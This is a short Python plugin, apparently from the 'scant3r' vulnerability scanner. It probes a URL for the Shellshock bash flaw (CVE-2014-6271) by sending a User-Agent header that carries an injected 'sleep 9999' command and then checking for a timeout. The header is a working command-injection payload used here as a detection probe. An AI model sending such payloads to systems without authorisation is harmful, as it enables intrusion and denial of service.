from core.libs import Colors as c
from logging import getLogger
from core.libs import Http

log = getLogger('scant3r')

PAYLOAD = "User-agent: () {:;}; sleep 9999"

def main(url: str , http: Http):
    log.info('send the payload with 125 timeout value')
    request = http.send('GET', url, timeout=125, headers={'User-agent':"() {:;}; sleep 9999"}, IgnoreErrors=True)
    if type(request) == list and 'Read timed out. (read timeout' in str(request[1]):
        log.info(f'\n{c.good} {c.red} Shell Shock CVE-2014-6271 {c.rest}\nTarget: {url}\nHeader_payload="{PAYLOAD}"\ntimeout=120\n')

